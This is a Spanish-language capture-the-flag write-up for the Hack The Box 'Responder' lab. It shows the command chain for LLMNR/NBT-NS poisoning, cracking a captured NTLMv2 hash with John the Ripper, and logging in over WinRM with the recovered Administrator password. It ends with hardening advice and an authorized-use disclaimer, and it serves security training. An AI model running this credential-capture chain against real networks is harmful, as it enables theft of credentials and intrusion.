# Write-up: Responder (Hack The Box)

![Difficulty](https://img.shields.io/badge/Dificultad-F%C3%A1cil-brightgreen)
![Platform](https://img.shields.io/badge/Plataforma-HackTheBox-9FEF00)
![OS](https://img.shields.io/badge/OS-Windows-blue)

## 📋 Resumen Ejecutivo

Laboratorio centrado en la explotación de protocolos legados (**LLMNR/NBT-NS**) para la captura de hashes **NTLMv2** y posterior acceso remoto mediante **WinRM**.

El flujo completo del ataque consiste en:
1. Envenenar la resolución de nombres en la red local con `Responder`.
2. Capturar un hash NetNTLMv2 de un usuario legítimo.
3. Crackear el hash offline con `John the Ripper`.
4. Usar las credenciales obtenidas para autenticarse vía WinRM y obtener una shell.

---

## 🛠️ Herramientas utilizadas

- `nmap`
- `Responder`
- `John the Ripper`
- `evil-winrm`

---

## 🔍 Fase 1: Reconocimiento

Escaneo inicial para identificar servicios activos:

```bash
nmap -sV -sC -p- <IP_OBJETIVO>
```

**Servicios clave detectados:**

| Puerto | Servicio |
|--------|----------|
| 80/TCP  | HTTP |
| 445/TCP | SMB |
| 5985/TCP | WinRM |

---

## 🔑 Fase 2: Explotación

### 2.1 Captura del hash

Se utiliza `Responder` para envenenar peticiones LLMNR/NBT-NS en la red y capturar el hash NTLMv2 de un usuario que intenta autenticarse.

```bash
sudo responder -I <INTERFAZ_RED>
```

### 2.2 Descifrado del hash

```bash
# Asegurar el formato del hash (evitar saltos de línea)
echo -n 'Administrator::RESPONDER:...' > hashh.txt

# Ejecución de descifrado
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hashh.txt

# Visualización de credenciales
john --show hashh.txt
```

**Credenciales obtenidas:**

```
Administrator:badminton
```

---

## 💻 Fase 3: Acceso

Autenticación y enumeración mediante `evil-winrm`:

```bash
evil-winrm -i <IP_OBJETIVO> -u Administrator -p badminton
```

Localización de la flag:

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *flag.txt* -ErrorAction SilentlyContinue
```

---

## 🛡️ Fase 4: Fortificación (Hardening)

Recomendaciones para mitigar este vector de ataque en entornos reales:

1. **GPO:** Deshabilitar LLMNR y NetBIOS.
2. **SMB:** Habilitar SMB Signing obligatorio.
3. **WinRM:** Migrar a HTTPS y restringir ACLs.
4. **Monitorización:** Implementar EDR para detectar enumeración no autorizada.

---

## 📚 Lecciones aprendidas

- Los protocolos de resolución de nombres legados (LLMNR/NBT-NS) siguen habilitados por defecto en muchos entornos Windows y representan un riesgo real de captura de credenciales.
- La higiene de contraseñas es crítica: contraseñas débiles o presentes en diccionarios comunes (`rockyou.txt`) permiten el crackeo offline en minutos.
- WinRM mal configurado (sin restricciones ni HTTPS) facilita el movimiento lateral una vez comprometidas las credenciales.

---

## ⚠️ Disclaimer

Este write-up documenta la resolución de una máquina del laboratorio **Hack The Box** con fines educativos. No debe aplicarse ninguna técnica aquí descrita contra sistemas sin autorización explícita.
